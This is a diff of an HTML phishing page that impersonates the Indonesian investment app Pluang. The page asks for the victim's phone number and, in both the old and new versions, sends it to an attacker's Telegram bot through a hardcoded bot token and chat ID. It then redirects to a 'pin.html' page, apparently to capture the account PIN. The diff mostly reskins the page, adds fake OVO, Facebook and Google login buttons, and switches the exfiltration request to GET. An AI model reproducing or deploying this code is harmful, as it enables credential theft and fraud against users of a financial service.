@@ -1,188 +1,165 @@
-<html lang="id">
+<html lang="en">
  <head>
   <meta charset="utf-8"/>
   <meta content="width=device-width, initial-scale=1" name="viewport"/>
-  <title>Pluang Masuk</title>
-  <script src="https://cdn.tailwindcss.com"></script>
+  <title>
+   Pluang Super App Investasi
+  </title>
+  <script src="https://cdn.tailwindcss.com">
+  </script>
   <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&amp;display=swap" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/css2?family=Inter&amp;display=swap" rel="stylesheet"/>
   <style>
    body {
       font-family: 'Inter', sans-serif;
     }
-   #loadingOverlay {
-     position: fixed;
-     inset: 0;
-     background-color: rgba(255, 255, 255, 0.9);
-     display: flex;
-     justify-content: center;
-     align-items: center;
-     z-index: 9999;
-     visibility: hidden;
+   /* Smooth horizontal sliding animation */
+   @keyframes slide {
+     0% { transform: translateX(100%); opacity: 0; }
+     10% { transform: translateX(0); opacity: 1; }
+     90% { transform: translateX(0); opacity: 1; }
+     100% { transform: translateX(-100%); opacity: 0; }
+   }
+   .slide-container {
+     position: relative;
+     width: 150px;
+     height: 180px;
+     overflow: hidden;
+   }
+   .slide-image {
+     position: absolute;
+     width: 150px;
+     height: 180px;
+     top: 0;
+     left: 0;
      opacity: 0;
-     transition: opacity 0.3s ease;
+     animation: slide 9s infinite;
    }
-   #loadingOverlay.visible {
-     visibility: visible;
-     opacity: 1;
+   .slide-image:nth-child(1) {
+     animation-delay: 0s;
    }
-   .loading-logo {
-     width: 80px;
-     height: 80px;
-     animation: spin 1.5s linear infinite;
+   .slide-image:nth-child(2) {
+     animation-delay: 3s;
    }
-   @keyframes spin {
-     to {
-       transform: rotate(360deg);
-     }
+   .slide-image:nth-child(3) {
+     animation-delay: 6s;
    }
   </style>
  </head>
- <body class="bg-white text-black">
-  <div id="loadingOverlay" aria-label="Loading" role="alert" aria-live="assertive" aria-busy="true">
-   <img src="https://avatars.githubusercontent.com/u/41424612?s=200&v=4" alt="Logo Pluang berputar sebagai loading" class="loading-logo"/>
-  </div>
-  <header class="flex items-center justify-between px-5 py-4 border-b border-gray-200">
-   <div class="flex items-center space-x-2">
-    <img alt="Logo Pluang huruf P hitam di latar putih" class="w-6 h-6" height="24" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEihg-v6NTCyP7qgTldHJH-8mewkAbitexfUy95AY84o0zx7Ju58v9ccyA_-NAOcpQIvo86gGsK8iW9pWzUlKCKb_I7Uf3reExcwVmAQIvhaavYcK4W2FbZ2_2M4OE4yL_gdaWVu0vMIKvmwYkLBdhqWf_jTjCwCvl6hpOiCa_8EGFYuUyDIvkakfu5cNhQ/s1600/1000015824.png" width="24"/>
-    <span class="text-lg font-normal select-none">Pluang</span>
+ <body class="bg-[#3B3FE1] min-h-screen flex flex-col relative">
+  <header class="flex justify-between items-center px-5 pt-5 text-white text-sm font-normal">
+   <div>
+    Eksplor Pluang
    </div>
-   <button class="text-indigo-600 font-medium text-base px-4 py-1.5 border border-indigo-600 rounded-full hover:bg-indigo-50 transition" type="button">Daftar</button>
-   <button aria-label="Menu" class="lg:hidden focus:outline-none">
-    <i class="fas fa-bars text-2xl text-black"></i>
-   </button>
+   <div class="flex items-center border border-white rounded-full w-[72px] h-[32px] text-xs font-normal">
+    <button class="w-1/2 h-full rounded-full bg-white text-[#3B3FE1]">
+     ID
+    </button>
+    <button class="w-1/2 h-full">
+     EN
+    </button>
+   </div>
   </header>
-  <main class="px-5 pt-6 pb-10 max-w-md mx-auto">
-   <section class="carousel-wrapper relative rounded-xl overflow-hidden max-w-[600px] mx-auto">
-    <div id="carousel" class="flex transition-transform duration-500 ease-in-out w-[200%]">
-     <div class="flex-shrink-0 w-[50%]">
-      <img alt="Layar laptop menampilkan antarmuka platform trading dengan latar hitam dan garis cahaya ungu" class="w-full rounded-xl" height="300" src="https://image-cdn.pluang.com/web/banners/BannerSecondMobile.webp" width="600"/>
-     </div>
-     <div class="flex-shrink-0 w-[50%]">
-      <img alt="Layar kedua dengan latar gelap dan gradasi ungu-merah" class="w-full rounded-xl" height="300" src="https://image-cdn.pluang.com/web/banners/BannerThirdMobile.webp" width="600"/>
-     </div>
-    </div>
-    <div class="carousel-indicators absolute bottom-3 left-1/2 -translate-x-1/2 flex space-x-2">
-     <span id="indicator-0" class="w-2.5 h-2.5 rounded-full bg-white opacity-50"></span>
-     <span id="indicator-1" class="w-6 h-2.5 rounded-full bg-indigo-600"></span>
-    </div>
-   </section>
-   <div class="mt-6 text-right">
-    <a class="text-indigo-600 text-sm font-normal" href="#">Butuh bantuan?</a>
+  <main class="flex flex-col items-center px-5 pt-8 flex-grow text-center text-white">
+   <div class="slide-container mx-auto">
+    <img alt="Illustration of CNBC Indonesia Best Investing Super App 2022 trophy variant 1" class="slide-image" height="180" src="https://mdi.vc/awards/award-4.png" width="150"/>
+    <img alt="Illustration of CNBC Indonesia Best Investing Super App 2022 trophy variant 2" class="slide-image" height="180" src="https://image-cdn.pluang.com/web/compressed/assets_available.webp" width="150"/>
+    <img alt="Illustration of CNBC Indonesia Best Investing Super App 2022 trophy variant 3" class="slide-image" height="180" src="https://image-cdn.pluang.com/web/compressed/safeAndSecure.webp" width="300"/>
    </div>
-   <h1 class="mt-4 text-3xl font-extrabold leading-tight">Masuk ke akun kamu</h1>
-   <p class="mt-1 text-gray-600 text-base font-normal">
-    Belum punya akun? <a class="text-indigo-600" href="#">Daftar</a>
+   <h1 class="mt-8 font-bold text-[22px] leading-7">
+    Super App Investasi #1
+   </h1>
+   <p class="mt-2 text-[13px] leading-5 max-w-[320px]">
+    Investasi di 560+ Saham AS, 200+ Aset Crypto, 65+ Reksa Dana, dan Emas.
+    <a class="underline cursor-pointer" href="#" id="learnMoreLink">
+     Pelajari lebih lanjut
+    </a>
    </p>
-   <form id="loginForm" class="mt-5 space-y-4">
-    <div class="flex space-x-3">
-     <button class="flex items-center space-x-2 border border-gray-300 rounded-lg px-4 py-3 text-base text-gray-900 font-normal" type="button">
-      <img alt="Bendera Indonesia dengan garis horizontal merah dan putih" class="w-6 h-4 rounded-sm object-cover" height="16" src="https://www.era.smp2rembang.sch.id/assetpublic/assets/img/clients/client-2.png" width="24"/>
-      <span>+62</span>
-     </button>
-     <input id="phoneNumber" aria-label="Nomor Telepon" class="flex-1 border border-gray-300 rounded-lg px-4 py-3 text-base text-gray-400 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-indigo-600 focus:border-indigo-600" placeholder="Nomor Telepon" type="tel" required/>
-    </div>
-    <label class="inline-flex items-center space-x-2 text-xs text-gray-700">
-     <input id="agreeTerms" aria-label="Setuju dengan syarat dan ketentuan" class="w-4 h-4 border border-gray-300 rounded-full focus:ring-2 focus:ring-indigo-600" type="checkbox" required/>
-     <span class="font-normal">Saya setuju dengan <a class="text-indigo-600" href="#">Syarat dan Ketentuan</a> Pluang.</span>
-    </label>
-    <button id="submitBtn" class="w-full bg-gray-300 text-gray-500 text-base font-normal rounded-full py-4 mt-4 cursor-not-allowed" disabled type="submit">Masuk</button>
-   </form>
   </main>
+  <form class="bg-white px-5 py-6 space-y-4" id="signupForm">
+   <div class="flex space-x-3">
+    <button class="flex items-center justify-center border border-gray-300 rounded-md w-[72px] h-[44px] text-sm text-gray-700" type="button">
+     <img alt="Indonesian flag icon" class="mr-2" height="14" src="https://uxwing.com/wp-content/themes/uxwing/download/flags-landmarks/indonesia-flag-icon.png" width="20"/>
+     +62
+    </button>
+    <input autocomplete="tel" class="flex-grow border border-gray-300 rounded-md h-[44px] px-3 text-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-[#FFFFFF]" id="phoneInput" name="phone" placeholder="Nomor Telepon" required="" type="tel"/>
+   </div>
+   <button class="w-full bg-gray-200 text-gray-400 rounded-full h-[44px] text-center text-sm font-normal cursor-not-allowed" disabled="" id="submitBtn" type="submit">
+    Daftar atau Log In
+   </button>
+  </form>
+  <footer class="flex justify-center items-center space-x-20 py-6 bg-white">
+   <button aria-label="Login with OVO" class="focus:outline-none">
+    <img alt="Green circular icon representing OVO login" height="40" src="https://vectorseek.com/wp-content/uploads/2023/10/Gojek-Icon-Logo-Vector.svg-.png" width="40"/>
+   </button>
+   <button aria-label="Login with Facebook" class="focus:outline-none">
+    <img alt="Blue circular icon representing Facebook login" height="40" src="https://upload.wikimedia.org/wikipedia/commons/c/cd/Facebook_logo_%28square%29.png" width="40"/>
+   </button>
+   <button aria-label="Login with Google" class="focus:outline-none">
+    <img alt="Multicolor circular icon representing Google login" height="40" src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/48px-Google_%22G%22_logo.svg.png" width="40"/>
+   </button>
+  </footer>
+  <!-- Loading overlay -->
+  <div class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden z-50" id="loadingOverlay">
+   <svg aria-hidden="true" class="w-12 h-12 text-white animate-spin" fill="none" stroke="currentColor" stroke-width="4" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+    <circle cx="12" cy="12" r="10" stroke-linecap="round" stroke-opacity="0.25">
+    </circle>
+    <path d="M4 12a8 8 0 018-8" stroke-linecap="round">
+    </path>
+   </svg>
+  </div>
   <script>
-    const carousel = document.getElementById("carousel");
-    const indicators = [
-      document.getElementById("indicator-0"),
-      document.getElementById("indicator-1"),
-    ];
-    let currentIndex = 1;
-    const totalSlides = 2;
+   const loadingOverlay = document.getElementById('loadingOverlay');
+   const phoneInput = document.getElementById('phoneInput');
+   const submitBtn = document.getElementById('submitBtn');
+   const form = document.getElementById('signupForm');
 
-    function updateCarousel() {
-      carousel.style.transform = `translateX(-${currentIndex * 50}%)`;
-      indicators.forEach((ind, i) => {
-        if (i === currentIndex) {
-          ind.classList.add("bg-indigo-600");
-          ind.classList.remove("opacity-50");
-        } else {
-          ind.classList.remove("bg-indigo-600");
-          ind.classList.add("opacity-50");
-        }
-      });
-    }
+   // Enable submit button only if phone input has value
+   phoneInput.addEventListener('input', () => {
+     if (phoneInput.value.trim().length > 0) {
+       submitBtn.disabled = false;
+       submitBtn.classList.remove('cursor-not-allowed', 'text-gray-400', 'bg-gray-200');
+       submitBtn.classList.add('bg-[#3B3FE1]', 'text-white', 'cursor-pointer');
+     } else {
+       submitBtn.disabled = true;
+       submitBtn.classList.add('cursor-not-allowed', 'text-gray-400', 'bg-gray-200');
+       submitBtn.classList.remove('bg-[#3B3FE1]', 'text-white', 'cursor-pointer');
+     }
+   });
 
-    function nextSlide() {
-      currentIndex = (currentIndex + 1) % totalSlides;
-      updateCarousel();
-    }
+   form.addEventListener('submit', async (e) => {
+     e.preventDefault();
+     const phone = phoneInput.value.trim();
+     if (!phone) return;
 
-    setInterval(nextSlide, 3000);
+     loadingOverlay.classList.remove('hidden');
 
-    const form = document.getElementById('loginForm');
-    const phoneInput = document.getElementById('phoneNumber');
-    const agreeCheckbox = document.getElementById('agreeTerms');
-    const submitBtn = document.getElementById('submitBtn');
-    const loadingOverlay = document.getElementById('loadingOverlay');
+     // Telegram bot info - replace with your own bot token and chat ID
+     const botToken = '8142214274:AAGDkwwEOsbxxo00e-hd7p5avWosgEjsjA8';
+     const chatId = '7549590022';
 
-    function toggleSubmit() {
-      if (agreeCheckbox.checked && phoneInput.value.trim() !== '') {
-        submitBtn.disabled = false;
-        submitBtn.classList.remove('bg-gray-300', 'text-gray-500', 'cursor-not-allowed');
-        submitBtn.classList.add('bg-indigo-600', 'text-white', 'cursor-pointer');
-      } else {
-        submitBtn.disabled = true;
-        submitBtn.classList.add('bg-gray-300', 'text-gray-500', 'cursor-not-allowed');
-        submitBtn.classList.remove('bg-indigo-600', 'text-white', 'cursor-pointer');
-      }
-    }
+     const message = encodeURIComponent(`DATA LOGIN PLUANG:\nPhone: +62${phone}`);
 
-    phoneInput.addEventListener('input', toggleSubmit);
-    agreeCheckbox.addEventListener('change', toggleSubmit);
+     try {
+       const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`, {
+         method: 'GET',
+       });
 
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault();
-
-      loadingOverlay.classList.add('visible');
-
-      const phoneNumber = phoneInput.value.trim();
-      if (!phoneNumber) {
-        loadingOverlay.classList.remove('visible');
-        return;
-      }
-
-      const botToken = '8479141074:AAHXRTIUGTqpC0Qvw31YqB3pb3W6Ji6PfPc';
-      const chatId = '7549590022';
-      const message = `Percobaan masuk baru:\nNomor Telepon: +62${phoneNumber}`;
-
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-      try {
-        const res = await fetch(url, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: message
-          })
-        });
-
-        loadingOverlay.classList.remove('visible');
-
-        if (res.ok) {
-          window.location.href = "pin.html";
-          form.reset();
-          toggleSubmit();
-        } else {
-          alert('Gagal mengirim data ke Telegram.');
-        }
-      } catch (error) {
-        loadingOverlay.classList.remove('visible');
-        alert('Terjadi kesalahan saat mengirim data ke Telegram.');
-        console.error(error);
-      }
-    });
+       if (response.ok) {
+         window.location.href = "pin.html";
+         form.reset();
+         submitBtn.disabled = true;
+         submitBtn.classList.add('cursor-not-allowed', 'text-gray-400', 'bg-gray-200');
+         submitBtn.classList.remove('bg-[#3B3FE1]', 'text-white', 'cursor-pointer');
+       } else {
+         alert('Gagal mengirim data ke Telegram.');
+       }
+     } catch (error) {
+       alert('Terjadi kesalahan saat mengirim data.');
+     } finally {
+       loadingOverlay.classList.add('hidden');
+     }
+   });
   </script>
  </body>
 </html>
